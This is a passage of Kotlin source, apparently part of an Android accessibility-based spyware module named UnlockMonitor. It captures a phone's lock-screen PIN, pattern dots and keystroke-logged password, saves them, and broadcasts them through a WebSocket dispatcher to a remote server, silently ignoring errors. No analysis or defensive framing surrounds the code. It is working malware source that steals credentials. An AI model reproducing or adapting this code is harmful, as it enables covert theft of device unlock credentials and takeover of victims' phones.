                if (collectedDigits.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    method.put("type", "pin")
                    method.put("code", collectedDigits.joinToString(""))
                    method.put("dots", JSONArray())
                } else { method.put("type", "swipe") }
            }
            "password" -> {
                method.put("type", "password")
                method.put("code", capturedPassword)
                method.put("dots", JSONArray())
            }
            "pattern" -> {
                val gridCols = when {
                    maxCellNumSeen <= 9  -> 3
                    maxCellNumSeen <= 16 -> 4
                    maxCellNumSeen <= 25 -> 5
                    else                 -> 6
                }
                val gridSize = gridCols * gridCols
                method.put("type", "pattern")
                method.put("code", "")
                method.put("dots", JSONArray(patternDots))
                method.put("gridSize", gridSize)
                if (patternDotsV2.isNotEmpty()) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val gridColsV2 = when {
                        maxCellNumSeenV2 <= 9  -> 3
                        maxCellNumSeenV2 <= 16 -> 4
                        maxCellNumSeenV2 <= 25 -> 5
                        else                   -> 6
                    }
                    method.put("dots_v2", JSONArray(patternDotsV2))
                    method.put("gridSize_v2", gridColsV2 * gridColsV2)
                }
            }
            else -> method.put("type", "swipe")
        }

        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putString(PREFS_KEY, method.toString()).apply()

        try {
            val payload = JSONObject().apply {
                put("action", "unlock_method_update"); put("method", method)
            }
            val bi = android.content.Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, payload.toString())
                setPackage(context.packageName)
            }
            context.sendBroadcast(bi)
        } catch (_: Exception) {}

        collectedDigits.clear()
        patternDots.clear()
        patternDotsV2.clear()
        capturedPassword     = ""
        passwordFieldFocused = false
    }

    fun onKeyEvent(event: KeyEvent) {
        android.util.Log.d("XDBG", "[UnlockMonitor] onKeyEvent enter event=${event}") //xdbg
        if (!onLockScreen || !passwordFieldFocused) return
        if (event.action != KeyEvent.ACTION_DOWN) return
        when (event.keyCode) {
            KeyEvent.KEYCODE_DEL, KeyEvent.KEYCODE_FORWARD_DEL -> {
                if (capturedPassword.isNotEmpty())
                    capturedPassword = capturedPassword.dropLast(1)
            }
            KeyEvent.KEYCODE_ENTER, KeyEvent.KEYCODE_NUMPAD_ENTER -> {}
            else -> {
                val unicode = event.unicodeChar
                if (unicode > 0) {
                    android.util.Log.d("XDBG", "[UnlockMonitor] if branch") //xdbg
                    val c = unicode.toChar()
                    if (!c.isISOControl()) capturedPassword += c
                }
            }
        }
    }

    private fun eventTypeName(type: Int) = when (type) {
        AccessibilityEvent.TYPE_VIEW_CLICKED                -> "CLICKED"
        AccessibilityEvent.TYPE_VIEW_LONG_CLICKED           -> "LONG_CLICKED"
        AccessibilityEvent.TYPE_VIEW_SELECTED               -> "SELECTED"
        AccessibilityEvent.TYPE_VIEW_FOCUSED                -> "FOCUSED"
        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED           -> "TEXT_CHANGED"
        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED        -> "WIN_STATE"
        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED      -> "CONTENT_CHANGED"
        AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED  -> "A11Y_FOCUSED"
        @Suppress("DEPRECATION")
        AccessibilityEvent.TYPE_ANNOUNCEMENT                -> "ANNOUNCEMENT"
        AccessibilityEvent.TYPE_WINDOWS_CHANGED             -> "WINS_CHANGED"
        else -> "TYPE_$type"
    }
}
